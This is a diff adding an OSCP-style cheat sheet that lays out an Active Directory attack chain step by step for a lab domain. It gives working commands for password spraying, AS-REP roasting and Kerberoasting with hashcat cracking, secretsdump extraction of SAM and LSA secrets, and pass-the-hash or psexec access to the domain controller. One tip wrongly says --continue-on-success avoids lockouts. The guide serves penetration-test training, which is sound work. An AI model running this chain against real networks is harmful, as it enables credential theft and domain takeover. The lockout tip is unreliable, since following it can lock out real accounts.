@@ -1,0 +1,99 @@
+===========================================
+ACTIVE DIRECTORY ATTACK METHODOLOGY
+OSCP Reference Guide
+===========================================
+
+STEP 1 — PASSWORD SPRAY
+------------------------
+Spray known/leaked passwords against domain users:
+
+  crackmapexec smb <DC-IP> -u <userlist> -p '<password>' --continue-on-success
+
+Look for [+] (valid creds) and (Pwn3d!) (local admin).
+
+
+STEP 2 — ASREPROASTING
+------------------------
+Find users with Kerberos pre-auth disabled and grab their hashes:
+
+  impacket-GetNPUsers -dc-ip <DC-IP> -request -outputfile hashes.asreproast corp.com/<user>:'<password>'
+
+Create rule file:
+  echo -e '\n$1\n$!' > crack.rule
+
+Crack with hashcat:
+  hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r crack.rule --force
+  hashcat -m 18200 hashes.asreproast --show
+
+
+STEP 3 — KERBEROASTING
+------------------------
+Find service accounts with SPNs and grab their TGS hashes:
+
+  impacket-GetUserSPNs -request -dc-ip <DC-IP> corp.com/<user>:'<password>' -outputfile tgs.txt
+
+Crack with hashcat:
+  hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r crack.rule --force
+  hashcat -m 13100 tgs.txt --show
+
+NOTE: Check MemberOf field in output — look for Domain Admins!
+
+
+STEP 4 — FIND LOCAL ADMIN ACCESS
+----------------------------------
+Spray cracked credentials across all machines:
+
+  crackmapexec smb <IP-range> -u <user> -p '<password>' --continue-on-success
+
+Look for (Pwn3d!) — that's your pivot machine.
+
+
+STEP 5 — DUMP CREDENTIALS FROM PIVOT MACHINE
+----------------------------------------------
+Use local admin access to dump secrets:
+
+  impacket-secretsdump corp.com/<user>:'<password>'@<target-IP>
+
+Look for:
+  - NT hashes in SAM dump (uid:rid:lmhash:nthash)
+  - Plaintext passwords in LSA Secrets (_SC_* entries)
+  - Cached domain hashes (DCC2)
+
+
+STEP 6 — ACCESS THE DOMAIN CONTROLLER
+---------------------------------------
+Once you have DA credentials or hash:
+
+  # RDP
+  xfreerdp /u:<user> /d:corp.com /p:'<password>' /v:<DC-IP>
+
+  # PSExec
+  impacket-psexec corp.com/<user>:'<password>'@<DC-IP>
+
+  # Pass-the-Hash
+  impacket-psexec -hashes :<NThash> corp.com/<user>@<DC-IP>
+
+
+STEP 7 — GRAB THE FLAG
+------------------------
+  type C:\Users\Administrator\Desktop\flag.txt
+
+
+===========================================
+QUICK REFERENCE — HASHCAT MODES
+===========================================
+  AS-REP  (ASREPRoast)  → -m 18200
+  TGS-REP (Kerberoast)  → -m 13100
+  NT Hash               → -m 1000
+
+
+===========================================
+NOTES & TIPS
+===========================================
+  - Use single quotes around passwords containing ! to avoid bash history expansion
+  - Always use --continue-on-success with crackmapexec to avoid lockouts
+  - Check MemberOf in Kerberoast output for Domain Admin service accounts
+  - LSA Secrets often contain plaintext passwords for service accounts
+  - If account is locked out, wait ~30 min or revert the machine
+  - DC IP is usually the first IP in the range
+
